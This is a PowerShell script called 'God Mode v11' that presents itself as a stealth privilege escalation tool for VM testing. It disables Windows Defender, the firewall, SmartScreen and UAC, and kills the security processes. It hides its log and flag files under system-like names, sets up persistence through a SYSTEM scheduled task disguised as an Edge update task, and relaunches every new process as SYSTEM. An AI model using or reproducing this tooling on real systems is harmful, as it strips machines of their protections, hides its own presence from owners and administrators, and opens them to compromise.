#Requires -RunAsAdministrator

<#
.SYNOPSIS
    God Mode v11 - Overhauled (Dangerous + Stealth Combined)
.DESCRIPTION
    Advanced privilege escalation tool with stealth capabilities.
    For VM security testing only. Restricted to Built-in Administrator.
#>

param(
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$Status,
    [switch]$Launch,
    [switch]$Help
)

$FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
$LogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
$TaskPrefix = "MicrosoftEdgeUpdateTask_"

# ============================================================
#  SECURITY: Only allow Built-in Administrator
# ============================================================
function Test-IsBuiltInAdmin {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    return $sid -like "*-500"
}

if (-not (Test-IsBuiltInAdmin) -and -not $Status -and -not $Help) {
    Write-Host "`n[ACCESS DENIED] This tool can only be used by the Built-in Administrator." -ForegroundColor Red
    exit 1
}

# ============================================================
#  CORE FUNCTIONS
# ============================================================

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[$timestamp] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
}

function Apply-DangerousConfiguration {
    Write-Log "Applying dangerous configuration..." "WARN"

    try {
        # Disable Windows Defender
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

        # Disable Windows Firewall
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false -ErrorAction SilentlyContinue

        # Disable SmartScreen
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
            -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue

        # Disable UAC
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
            -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
            -Name ConsentPromptBehaviorAdmin -Value 0 -Force

        # Attempt to stop Defender processes
        Get-Process -Name MsMpEng, smartscreen, SecurityHealthService -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue

        Write-Log "Dangerous configuration applied successfully." "WARN"
    }
    catch {
        Write-Log "Error applying dangerous settings: $_" "ERROR"
    }
}

function Revert-DangerousConfiguration {
    Write-Log "Reverting dangerous configuration..." "WARN"
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
            -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
            -Name EnableLUA -Value 1 -Force
        Start-Service -Name WinDefend -ErrorAction SilentlyContinue
        Write-Log "Configuration reverted." "OK"
    }
    catch {
        Write-Log "Failed to fully revert settings: $_" "ERROR"
    }
}

function Set-GodMode {
    param([bool]$Enable)
    if ($Enable) {
        "1" | Out-File $FlagFile -Force
        Apply-DangerousConfiguration
        Register-StealthTask
        Write-Log "God Mode ENABLED (Dangerous + Stealth)" "WARN"
    } else {
        Remove-Item $FlagFile -Force -ErrorAction SilentlyContinue
        Revert-DangerousConfiguration
        Unregister-StealthTask
        Write-Log "God Mode DISABLED" "WARN"
    }
}

function Register-StealthTask {
    $taskName = $TaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
    Unregister-StealthTask

    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"

    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
        -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Principal $principal -Force | Out-Null
}

function Unregister-StealthTask {
    Get-ScheduledTask -TaskName "$TaskPrefix*" -ErrorAction SilentlyContinue |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
}

function Get-GodModeStatus {
    if (Test-Path $FlagFile) {
        Write-Host "God Mode Status: ACTIVE (Dangerous + Stealth Mode)" -ForegroundColor Red
    } else {
        Write-Host "God Mode Status: INACTIVE" -ForegroundColor Green
    }
}

function Elevate-Process {
    param([string]$ExecutablePath)
    if (-not (Test-Path $ExecutablePath)) { return }

    Write-Log "Elevating process: $ExecutablePath" "STEALTH"

    try {
        $action = New-ScheduledTaskAction -Execute $ExecutablePath
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
            -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "TempElevate_" + (Get-Random -Minimum 1000 -Maximum 99999)

        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask
        Start-Sleep -Milliseconds 400
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
    }
    catch {
        Write-Log "Failed to elevate process: $ExecutablePath" "ERROR"
    }
}

function Start-Monitoring {
    if (-not (Test-Path $FlagFile)) {
        Write-Log "God Mode is not enabled." "ERROR"
        return
    }

    Write-Log "God Mode monitoring started..." "INFO"

    $processed = @{}

    while ($true) {
        Start-Sleep -Seconds 2

        $newProcesses = Get-WmiObject Win32_Process | Where-Object {
            $_.CreationDate -and 
            ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-10)
        }

        foreach ($proc in $newProcesses) {
            if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
                if (-not $processed.ContainsKey($proc.ExecutablePath)) {
                    $processed[$proc.ExecutablePath] = $true
                    Elevate-Process $proc.ExecutablePath
                }
            }
        }
    }
}

# ============================================================
#  MAIN EXECUTION
# ============================================================

if ($Help) {
    Write-Host @"
God Mode v11 - Commands:
  -ToggleOn     Enable God Mode (Dangerous + Stealth)
  -ToggleOff    Disable God Mode
  -Status       Show current status
  -Launch       Start monitoring manually
"@ -ForegroundColor Cyan
    exit
}

if ($ToggleOn)  { Set-GodMode $true; exit }
if ($ToggleOff) { Set-GodMode $false; exit }
if ($Status)    { Get-GodModeStatus; exit }

if ($Launch) {
    Start-Monitoring
}